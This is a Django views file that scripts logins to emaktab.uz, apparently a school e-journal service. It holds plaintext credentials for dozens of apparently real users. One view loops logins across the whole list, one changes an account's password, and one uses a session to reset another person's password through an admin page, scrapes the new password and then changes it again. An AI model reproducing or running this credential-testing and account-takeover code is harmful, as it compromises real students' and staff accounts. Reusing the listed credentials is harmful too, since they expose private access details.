import time

from django.contrib.auth.mixins import LoginRequiredMixin
from django.shortcuts import render
from django.views import View
import requests

from testing.models import Testes


class IndexView(View):
	def get(self, request):
		tests = Testes.objects.all()
		# payload = {'login': 'mirxojiddinotajonov', 'password': '3121123um'}
		# for i in range(41):
		# 	response = requests.post("https://login.emaktab.uz/",payload)
		#
		# 	if response.text.find("Otajonov M.K.")== -1:
		# 		print(response.text)
		# 		print(str(i) + 'tizimga kirdi chiqdi')
		# 		break
		# 	print(str(i))
		# 	time.sleep(2)
		return render(request, 'index.html', {'tests': tests})


class NewView(View):
	def get(self, request):
		tests = Testes.objects.all()
		array = [
			['oyatilloabdulazizov1', 'Namuna1234'],
			['adhamjonovabbosbek', 'Namuna1234'],
			['azizbek.alijonov1701', 'Namuna1234'],
			['shaxriyor.alijonov05', 'Namuna1234'],
			['avazbekov.shodiyorbe', 'Namuna1234'],
			['bahodirovanaziraxon', 'Namuna1234'],
			['ergashevamuxtasar200', 'Namuna1234'],
			['abdulloh.erkaboyev', 'Namuna1234'],
			['xikmatullogulomjonov', 'Namuna1234'],
			['zulfiyaxon.ismoiljon', 'Namuna1234'],
			['muhammadrizoj2906200', 'Namuna1234'],
			['zulfiyaxonkamolova', 'Namuna1234'],
			['mamirjonova_rayxona', 'Namuna1234'],
			['odiljon.mamirov02200', 'Namuna1234'],
			['malohatmuhammadmusay', 'Namuna1234'],
			['odiljonova.gulzoda', 'Namuna1234'],
			['qobuljonovabdulaziz', 'Namuna1234'],
			['roziyabonu_z', 'Namuna1234'],
			['rshaxobiddinova07200', 'Namuna1234'],

		]

		array1 = [
			['boynazarov_dilmurod','Namuna1234'],
			['odinaxon.esonova0719','Namuna1234'],
			['mirzoxidjonismoilov','Namuna1234'],
			['maxmudov.umidjon0119','Namuna1234'],
			['gulmiraxon.nozimova','Namuna1234'],
			['omonov_salimjon','Namuna1234'],
			['nodirbek.qosimov3004','Namuna1234'],
			['qosimovanm','Namuna1233'],
			['qaxramonjonqochqorov','Namuna1233'],
			['kozimjonrizayev','Namuna1233'],
			['dsaidaliyev','Namuna1233'],
			['samatovamanzuraxon','Namuna1233'],
			['umidaxonsanginova','Namuna1233'],
			['zuxraxon.sattarova19','Namuna1233'],
			['ugiloy.z','Namuna1233'],
			['jamollidinyulchiyev','Namuna1233'],
			['shermatov.omadbek','Namuna1233'],
			['jchotiboyeva','Namuna1233'],
			['shuhratbek.ahmedov19', 'Namuna1233'],
			['boltaboyev.furqatjon', 'Namuna1233'],
			['ergasheva.umidaxon06', 'Namuna1233'],
			['nazirjon.ergashov', 'Namuna1233'],
			['valijon.ergashov', 'Namuna1233'],
			['erkaboyev.azizbek197', 'Namuna1233'],
			['gulsoraxon_ismoilova', 'Namuna1233'],
			['kamolov.ulugbek02198', 'Namuna1233'],
			['sarvaroymadraximova', 'Namuna1233'],
			['nilufarxon_nomonova', 'Namuna1233'],
			['matlubaxonnuriddinov', 'Namuna1233'],
			['jamilaxonqq', 'Namuna1233'],
			['ogiloyqurbonova01198', 'Namuna1233'],
			['otkirbek.rasulov1119', 'Namuna1233'],
			['rrsiddiqova', 'Namuna1233'],
			['nsotvoldiyeva0307198', 'Namuna1233'],
			['eldorbek_t', 'Namuna1233'],
			['tursunovmurodjon0819', 'Namuna1233'],
			['qudratbekxojimatov', 'Namuna1233'],
			['muslimaxon.arapova', 'Namuna1234'],
			['alisherarislonov', 'Namuna1234'],
			['boltaboyevluqmonjon', 'Namuna1234'],
			['egamberdiyevabdumuta', 'Namuna1234'],
			['asilbekergashev05198', 'Namuna1234'],
			['avazbekergashev05198', 'Namuna1234'],
			['mamadaliyevkozimjon1', 'Namuna1234'],
			['humoyunmirzayeva', 'Namuna1234'],
			['omonovshuhratbek', 'Namuna1234'],
			['oybek42', 'Namuna1234'],
			['osmonov.o', 'Namuna1234'],
			['gayratbekqobulov', 'Namuna1234'],
			['ilyosbekqoshaqov', 'Namuna1234'],
			['salomov.mansurbek', 'Namuna1234'],
			['samatov_akmaljon', 'Namuna1234'],
			['nilufarsobirjonovna', 'Namuna1234'],
			['xurriyatsodiqova', 'Namuna1234'],
			['adxamjonovtojiboyev', 'Namuna1234'],
			['toshboltayev.akmaljo', 'Namuna1234'],
			['ahmadjon.xolmatov197', 'Namuna1234'],
			['bayunusova', 'Namuna1234'],
			['abdumalik.ta', 'Namuna1234'],
			['ziyodbek_akbarov', 'Namuna1234'],
			['guljamol_axmedova', 'Namuna1234'],
			['tohiraashurova', 'Namuna1234'],
			['boymirzayev.hayrullo', 'Namuna1234'],
			['segamnazarova0503198', 'Namuna1234'],
			['ergashevazizbek27061', 'Namuna1234'],
			['mamurjon.gofurov0219', 'Namuna1234'],
			['davronbek.goyipov', 'Namuna1234'],
			['bunyodbekmadvaliyev', 'Namuna1234'],
			['bobojon.mamadaliyev', 'Namuna1234'],
			['anvarjonmamaliyev', 'Namuna1234'],
			['mullayevaranoxon', 'Namuna1234'],
			['g_noraliyeva', 'Namuna1234'],
			['jaxongir.oralov09198', 'Namuna1234'],
			['abdurahmatsaidov', 'Namuna1234'],
		]
		string = ''
		son=0
		for i in array1:
			payload = {'login': i[0], 'password': i[1]}
			response = requests.post("https://login.emaktab.uz/", payload)
			if response.text.find('action="https://login.emaktab.uz/logout"') == -1:
				text = response.text.replace('<form class="login" method="POST"', '<form class="login" method="POST" action="https://login.emaktab.uz">')
				string += text
				son += 1
			if son > 10:
				break
			time.sleep(50/1000)
		if string == '':
			return render(request, 'new.html', {'tests': 'ishladi' })
		else:
			return render(request, 'new.html', {'tests': string})

	def post (self, request):

		ress = request.POST.get('comment')
		payload = {'language': 'py', 'code': ress, 'input': ""}
		response = requests.post("https://api.codex.jaagrav.in/", json=payload)
		print(response.json())
		return render(request, 'new.html', {"ress": response.json()['output']})


class NewPassword(View):
	def get(self, request):
		session = requests.Session()
		payload = {'login': "sryunusova", 'password': "141438"}
		response1 = session.post(f"https://login.emaktab.uz/", payload)
		token_start = response1.text.find('<input id="Token" name="Token" type="hidden" value="')
		token_end = response1.text.find('" />', token_start+1)
		token = response1.text[token_start+52:token_end]
		print(token)
		payload = {
				'Token': token,
				'Login': 'sryunusova',
				'Password': "Namuna1236",
				'RepeatedPassword': "Namuna1236",

		}
		response2 = session.post(f"https://login.emaktab.uz/passwordchanged", payload)
		string1 = response2.text
		return render(request, 'new.html', {'tests': string1})


class NewPasswordGet(View):
	def get(self, request):
		session = requests.Session()
		payload = {'login': "mirxojiddinotajonov", 'password': "3121123um"}
		response1 = session.post(f"https://login.emaktab.uz/", payload)
		cookie = response1.cookies
		string1 = ""
		response2 = session.get(f"https://schools.emaktab.uz/v2/admin/persons/person?person=1000017540518&school=1000006479700&view=password")
		id = response2.text.find('<input name="__RequestVerificationToken" type="hidden" value="')
		idd = response2.text.find('" />', id+1)
		requestVerificationToken=response2.text[id+62:idd]
		payload = {"__RequestVerificationToken": requestVerificationToken, "change": "Joriy parolni o‘chirish "}
		response3 = session.post(f"https://schools.emaktab.uz/v2/admin/persons/person?person=1000017540518&school=1000006479700&view=password", payload)
		login_start = response3.text.find('<dd class="bold">')
		login_end = response3.text.find('</dd>', login_start)
		login1 = response3.text[login_start+17:login_end]
		parol_start = response3.text.find('<dd class="bold">', login_end+1)
		parol_end = response3.text.find('</dd>', parol_start)
		parol1 = response3.text[parol_start+17:parol_end]
		print(login1, parol1)
		session = requests.Session()
		payload = {'login': login1, 'password': parol1}
		response1 = session.post(f"https://login.emaktab.uz/", payload)
		token_start = response1.text.find('<input id="Token" name="Token" type="hidden" value="')
		token_end = response1.text.find('" />', token_start + 1)
		token = response1.text[token_start + 52:token_end]
		payload = {
			'Token': token,
			'Login': login1,
			'Password': "Namuna1239",
			'RepeatedPassword': "Namuna1239",

		}
		response2 = session.post(f"https://login.emaktab.uz/passwordchanged", payload)
		string1 = response2.text

		return render(request, 'new.html', {'tests': string1})
